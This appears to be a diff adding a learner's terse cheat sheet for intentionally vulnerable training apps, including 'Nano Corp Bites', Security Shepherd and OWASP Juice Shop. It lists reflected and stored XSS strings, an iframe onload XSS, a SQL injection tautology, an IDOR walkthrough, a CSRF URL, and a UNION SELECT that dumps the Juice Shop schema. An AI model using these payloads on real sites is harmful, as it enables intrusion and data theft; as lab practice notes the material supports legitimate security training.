@@ -1,4 +1,44 @@
+Tab 1
 
+NANO CORP BITES
+
+REFLECTED XSS-
+
+http://ip:port/restaurant/4?from=<script>alert(1)</script>
+
+
+STORED XSS
+
+<b>bold</b> or <img src=x onerror=alert('Stored-XSS')>
+
+
+Challenge 3 - IDOR
+
+Create 2 accounts generate order from both account
+Login with first account (here admn) d access the Go to order tab after http://ip:port/orders/id
+
+id = ur second account order number
+
+
+
+SECURITY SHEPHERD
+
+
+XSS -
+
+<iframe src='#' onload='alert("XSS")'></iframe>
+
+
+SQL INJECTION -
+
+" or "1" = "1
+
+
+CSRF
+
+USE PAYLOAD - https://localhost/root/grantComplete/csrfLesson?userId=temp-id
+
+-------------------------------------------------------------------------------------------------------------
 
 juice-- databaseschema
 http://192.168.20.47:45868/rest/products/search?q=apple%27))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--
